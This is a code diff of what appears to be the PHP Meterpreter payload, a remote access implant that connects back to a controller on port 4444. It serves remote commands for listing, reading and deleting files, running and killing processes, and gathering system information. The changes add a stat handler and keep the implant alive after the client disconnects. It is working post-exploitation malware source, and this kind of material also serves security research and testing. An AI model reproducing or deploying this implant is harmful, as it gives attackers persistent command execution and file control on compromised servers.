@@ -1,7 +1,8 @@
-#<?php
+#<?php # This lets us run as a standalone file or as eval'd code
 function my_print($str) {
-	print($str ."\n");
-	flush();
+	error_log($str);
+	#print($str ."\n");
+	#flush();
 }
 if (!function_exists("file_get_contents")) {
     function file_get_contents($file) {
@@ -309,7 +310,7 @@ my_print("Evaling stdapi");
 # works
 if (!function_exists('stdapi_fs_chdir')) {
 function stdapi_fs_chdir($req, &$pkt) {
-    my_print("doing chdir\n");
+    my_print("doing chdir");
     $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
     chdir($path_tlv['value']);
     return ERROR_SUCCESS;
@@ -318,7 +319,7 @@ function stdapi_fs_chdir($req, &$pkt) {
 
 if (!function_exists('stdapi_fs_delete')) {
 function stdapi_fs_delete($req, &$pkt) {
-    my_print("doing delete\n");
+    my_print("doing delete");
     $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_NAME);
     $ret = unlink($path_tlv['value']);
     return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
@@ -328,7 +329,7 @@ function stdapi_fs_delete($req, &$pkt) {
 # works
 if (!function_exists('stdapi_fs_getwd')) {
 function stdapi_fs_getwd($req, &$pkt) {
-    my_print("doing pwd\n");
+    my_print("doing pwd");
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, getcwd()));
     return ERROR_SUCCESS;
 }
@@ -338,16 +339,16 @@ function stdapi_fs_getwd($req, &$pkt) {
 # windows
 if (!function_exists('stdapi_fs_ls')) {
 function stdapi_fs_ls($req, &$pkt) {
-    my_print("doing ls\n");
+    my_print("doing ls");
     $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
     $path = $path_tlv['value'];
     $dir_handle = @opendir($path);
 
     if ($dir_handle) {
-        #my_print("Doing an ls\n");
+        #my_print("Doing an ls");
         while ($file = readdir($dir_handle)) {
             if ($file != "." && $file != "..") {
-                #my_print("Adding file $file\n");
+                #my_print("Adding file $file");
                 packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $file));
                 packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path . DIRECTORY_SEPARATOR . $file));
                 $st = stat($path . DIRECTORY_SEPARATOR . $file);
@@ -377,16 +378,42 @@ function stdapi_fs_ls($req, &$pkt) {
 }
 }
 
+if (!function_exists('stdapi_fs_stat')) {
+function stdapi_fs_stat($req, &$pkt) {
+    my_print("doing stat");
+    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
+    $path = $path_tlv['value'];
+
+    $st = stat($path);
+    $st_buf = "";
+    $st_buf .= pack("V", $st['dev']);
+    $st_buf .= pack("v", $st['ino']);
+    $st_buf .= pack("v", $st['mode']);
+    $st_buf .= pack("v", $st['nlink']);
+    $st_buf .= pack("v", $st['uid']);
+    $st_buf .= pack("v", $st['gid']);
+    $st_buf .= pack("v", 0);
+    $st_buf .= pack("V", $st['rdev']);
+    $st_buf .= pack("V", $st['size']);
+    $st_buf .= pack("V", $st['atime']);
+    $st_buf .= pack("V", $st['mtime']);
+    $st_buf .= pack("V", $st['ctime']);
+    $st_buf .= pack("V", $st['blksize']);
+    $st_buf .= pack("V", $st['blocks']);
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
+}
+}
+
 # works
 if (!function_exists('stdapi_fs_delete_file')) {
 function stdapi_fs_delete_file($req, &$pkt) {
-    my_print("doing delete\n");
+    my_print("doing delete");
     $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
     $path = $path_tlv['value'];
 
     if ($path && is_file($path)) {
-        @unlink($path);
-        return ERROR_SUCCESS;
+        $worked = @unlink($path);
+        return ($worked ? ERROR_SUCCESS : ERROR_FAILURE);
     } else {
         return ERROR_FAILURE;
     }
@@ -396,7 +423,7 @@ function stdapi_fs_delete_file($req, &$pkt) {
 # works
 if (!function_exists('stdapi_sys_config_getuid')) {
 function stdapi_sys_config_getuid($req, &$pkt) {
-    my_print("doing getuid\n");
+    my_print("doing getuid");
     if (is_callable('posix_getuid')) {
         $uid = posix_getuid();
         $pwinfo = posix_getpwuid($uid);
@@ -415,7 +442,7 @@ function stdapi_sys_config_getuid($req, &$pkt) {
 # Unimplemented becuase it's unimplementable
 if (!function_exists('stdapi_sys_config_rev2self')) {
 function stdapi_sys_config_rev2self($req, &$pkt) {
-    my_print("doing rev2self\n");
+    my_print("doing rev2self");
     return ERROR_FAILURE;
 }
 }
@@ -423,7 +450,7 @@ function stdapi_sys_config_rev2self($req, &$pkt) {
 # works
 if (!function_exists('stdapi_sys_config_sysinfo')) {
 function stdapi_sys_config_sysinfo($req, &$pkt) {
-    my_print("doing sysinfo\n");
+    my_print("doing sysinfo");
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMPUTER_NAME, php_uname("n")));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_OS_NAME, php_uname()));
     return ERROR_SUCCESS;
@@ -433,7 +460,7 @@ function stdapi_sys_config_sysinfo($req, &$pkt) {
 $processes = array();
 if (!function_exists('stdapi_sys_process_execute')) {
 function stdapi_sys_process_execute($req, &$pkt) {
-    my_print("doing execute\n");
+    my_print("doing execute");
     $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
     $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
     $flags_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_FLAGS);
@@ -444,15 +471,15 @@ function stdapi_sys_process_execute($req, &$pkt) {
 
     # If there was no command specified, well, a user sending an empty command
     # deserves failure.
-    my_print("Cmd: $cmd $args\n");
+    my_print("Cmd: $cmd $args");
     $real_cmd = $cmd ." ". $args;
     if (0 > strlen($cmd)) {
         return ERROR_FAILURE;
     }
-    my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")\n");
+    my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
     if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
         global $processes, $channels;
-        my_print("Channelized\n");
+        my_print("Channelized");
         $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
         if ($handle === false) {
             return ERROR_FAILURE;
@@ -478,7 +505,7 @@ function stdapi_sys_process_execute($req, &$pkt) {
 # exist on older versions.
 if (!function_exists('stdapi_sys_process_get_processes')) {
 function stdapi_sys_process_get_processes($req, &$pkt) {
-    my_print("doing get_processes\n");
+    my_print("doing get_processes");
     $list = array();
 	# This command produces a line like:
 	#    1553 root     /sbin/getty -8 38400 tty1
@@ -506,7 +533,7 @@ function stdapi_sys_process_get_processes($req, &$pkt) {
 # works
 if (!function_exists('stdapi_sys_process_getpid')) {
 function stdapi_sys_process_getpid($req, &$pkt) {
-    my_print("doing getpid\n");
+    my_print("doing getpid");
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, getmypid()));
     return ERROR_SUCCESS;
 }
@@ -517,14 +544,14 @@ function stdapi_sys_process_kill($req, &$pkt) {
 	# The existence of posix_kill is unlikely (it's a php compile-time option
 	# that isn't enabled by default, but better to try it and avoid shelling
 	# out when unnecessary.
-    my_print("doing kill\n");
+    my_print("doing kill");
     $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
     $pid = $pid_tlv['value'];
     if (is_callable('posix_kill')) {
         $ret = posix_kill($pid, 9);
         $ret = $ret ? ERROR_SUCCESS : posix_get_last_error();
         if ($ret != ERROR_SUCCESS) {
-            my_print(posix_strerror($ret) . "\n");
+            my_print(posix_strerror($ret));
         }
     } else {
         # every rootkit should have command injection vulnerabilities
@@ -547,9 +574,10 @@ function stdapi_sys_process_kill($req, &$pkt) {
 ##
 # Channel Helper Functions
 ##
+
+# global list of channels
 $channels = array();
 
-# XXX Does not honor a given mode, opens in read-only
 function channel_create_stdapi_fs_file($req, &$pkt) {
     global $channels;
     $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
@@ -563,9 +591,11 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
     if (is_resource($fd)) {
         array_push($channels, array(0 => $fd, 1 => $fd));
         $id = count($channels) - 1;
-        my_print("Created new channel $fd, with id $id\n");
+        my_print("Created new channel $fd, with id $id");
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
         return ERROR_SUCCESS;
+    } else {
+        my_print("Failed to open");
     }
     return ERROR_FAILURE;
 }
@@ -583,24 +613,26 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
 function core_channel_open($req, &$pkt) {
     $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE);
 
-    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do\n");
+    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do");
     $handler = "channel_create_". $type_tlv['value'];
     if ($type_tlv['value'] && is_callable($handler)) {
         $ret = $handler($req, $pkt);
     } else {
-        $ret = channel_create_generic($req, $pkt);
+        my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
+        #$ret = channel_create_generic($req, $pkt);
+        $ret = ERROR_FAILURE;
     }
     
     return $ret;
 }
 function core_channel_eof($req, &$pkt) {
-    my_print("doing channel eof\n");
+    my_print("doing channel eof");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $c = get_channel_by_id($chan_tlv['value']);
     var_dump($c);
 
     if ($c) {
-        if (feof($c[1])) {
+        if (@feof($c[1])) {
             packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
         } else {
             packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
@@ -614,7 +646,7 @@ function core_channel_eof($req, &$pkt) {
 # Works for streams that work with fread
 # TODO: Genericize me
 function core_channel_read($req, &$pkt) {
-    print "doing channel read\n";
+    my_print("doing channel read");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
     $id = $chan_tlv['value'];
@@ -632,7 +664,7 @@ function core_channel_read($req, &$pkt) {
 # Works for streams that work with fwrite
 # TODO: Genericize me
 function core_channel_write($req, &$pkt) {
-    print "doing channel write\n";
+    my_print("doing channel write");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
     $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
@@ -650,19 +682,23 @@ function core_channel_write($req, &$pkt) {
 }
 
 function core_channel_close($req, &$pkt) {
-    print "doing channel close\n";
+    my_print("doing channel close");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $id = $chan_tlv['value'];
 
     $c = get_channel_by_id($id);
     if ($c) {
         # We found a channel, close its stdin/stdout/stderr
-        @fclose($c[0]);
-        @fclose($c[1]);
-        @fclose($c[2]);
+        for($i = 0; $i < 3; $i++) {
+            my_print("closing channel fd $i, {$c[$i]}");
+            if (array_key_exists($i, $c) && is_resource($c[$i])) {
+                fclose($c[$i]);
+            }
+        }
+        return ERROR_SUCCESS;
     }
 
-    return ERROR_SUCCESS;
+    return ERROR_FAILURE;
 }
 
 # Libraries are sent as a zlib-compressed blob.  Unfortunately, zlib support is
@@ -671,7 +707,7 @@ function core_channel_close($req, &$pkt) {
 # actually implement loadlib yet.  Maybe someday we'll have
 # ext_server_stdapi.php or whatever.  For now just return success.
 function core_loadlib($req, &$pkt) {
-    my_print("doing core_loadlib (no-op)\n");
+    my_print("doing core_loadlib (no-op)");
     return ERROR_SUCCESS;
 }
 
@@ -683,7 +719,7 @@ $channels = array();
 
 function get_channel_by_id($chan_id) {
     global $channels;
-    my_print("looking for channel $chan_id\n");
+    my_print("looking for channel $chan_id");
     var_dump($channels);
     if (array_key_exists($chan_id, $channels)) {
         return $channels[$chan_id];
@@ -734,7 +770,7 @@ function create_response($req) {
     $pkt = pack("N", PACKET_TYPE_RESPONSE);
 
     $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
-    my_print("method is {$method_tlv['value']}\n");
+    my_print("method is {$method_tlv['value']}");
     packet_add_tlv($pkt, $method_tlv);
 
     $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
@@ -743,7 +779,7 @@ function create_response($req) {
     if (is_callable($method_tlv['value'])) {
         $result = $method_tlv['value']($req, $pkt);
     } else {
-        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure\n");
+        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure");
         $result = ERROR_FAILURE;
     }
 
@@ -759,7 +795,7 @@ function create_tlv($type, $val) {
 
 function tlv_pack($tlv) {
     $ret = "";
-    #my_print("Creating a tlv of type: {$tlv['type']}\n");
+    #my_print("Creating a tlv of type: {$tlv['type']}");
     if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
         $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
     } 
@@ -783,7 +819,7 @@ function tlv_pack($tlv) {
         $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
     } 
     else {
-        my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf\n");
+        my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf");
     }
     return $ret;
 }
@@ -793,13 +829,13 @@ function packet_add_tlv(&$pkt, $tlv) {
 }
 
 function packet_get_tlv($pkt, $type) {
-    #my_print("Looking for a tlv of type $type\n");
+    #my_print("Looking for a tlv of type $type");
     $offset = 8;
     while ($offset < strlen($pkt)) {
         $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
-        #my_print("len: {$tlv['len']}, type: {$tlv['type']}\n");
+        #my_print("len: {$tlv['len']}, type: {$tlv['type']}");
         if ($type == $tlv['type']) {
-            #my_print("Found one at offset $offset\n");
+            #my_print("Found one at offset $offset");
             if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
                 $tlv = unpack("Nlen/Ntype/a*value", substr($pkt, $offset, $tlv['len']));
             } 
@@ -814,14 +850,14 @@ function packet_get_tlv($pkt, $type) {
                 $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
             }
             else {
-                my_print("Wtf type is this? $type\n");
+                my_print("Wtf type is this? $type");
                 $tlv = NULL;
             }
             return $tlv;
         }
         $offset += $tlv['len'];
     }
-    my_print("Didn't find one, wtf\n");
+    my_print("Didn't find one, wtf");
     return false;
 }
 
@@ -835,14 +871,15 @@ function packet_get_tlv($pkt, $type) {
 
 ob_implicit_flush();
 error_reporting(E_ALL);
-#@ignore_user_abort(true);
-@ignore_user_abort(false);
+@ignore_user_abort(true);
+# Has no effect in safe mode, but try anyway
+@set_time_limit(0);
 
 $port = 4444;
 
 $listen = false;
 if ($listen) {
-	my_print("Listening on $port\n");
+	my_print("Listening on $port");
 
 	$setsockopt = 'socket_setopt';
 	if (!is_callable($setsockopt )) {
@@ -858,9 +895,9 @@ if ($listen) {
 	$msgsock = socket_accept($sock);
 	socket_close($sock);
 
-	print "Got a socket connection $sock\n";
+	my_print("Got a socket connection $sock");
 } else {
-	my_print("Connecting to $port\n");
+	my_print("Connecting to $port");
 	$ipaddr = '127.0.0.1';
 	$msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
 	$res = socket_connect($msgsock,$ipaddr,$port);
@@ -897,7 +934,7 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
 
             socket_write($msgsock, $response);
         } else {
-            my_print("not Msgsock\n");
+            my_print("not Msgsock");
             $data = socket_read($msgsock, 8, PHP_BINARY_READ);
             if (FALSE == $data) {
 
@@ -911,5 +948,6 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
     #    }
     #}
 }
+my_print("Finished");
 socket_close($msgsock);
 
